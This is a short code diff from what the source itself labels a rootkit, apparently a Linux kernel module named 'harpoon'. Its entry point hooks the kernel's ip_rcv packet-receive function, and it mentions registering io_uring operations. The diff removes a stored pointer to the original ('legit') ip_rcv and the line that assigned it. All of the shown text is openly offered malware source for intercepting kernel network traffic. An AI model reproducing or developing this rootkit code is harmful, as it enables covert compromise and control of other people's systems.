@@ -16,10 +16,6 @@ void harpoon_global_init(void){
     INIT_LIST_HEAD(&harpoon->hook_list);
 }
 
-/* Legit function */
-int (*legit_ip_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
-        struct net_device *orig_dev);
-
 /* Rootkit entrypoint */
 static int __init harpoon_init(void){
     struct harpoon_hook *ip_rcv_hook;
@@ -34,7 +30,6 @@ static int __init harpoon_init(void){
 
     // Hook ip_rcv
     ip_rcv_hook = harpoon_new_hook("ip_rcv", harpoon_ip_rcv, RECUR_DETECT);
-    legit_ip_rcv = ip_rcv_hook->legit;
     harpoon_hook(ip_rcv_hook);
 
     // Register io_uring operations
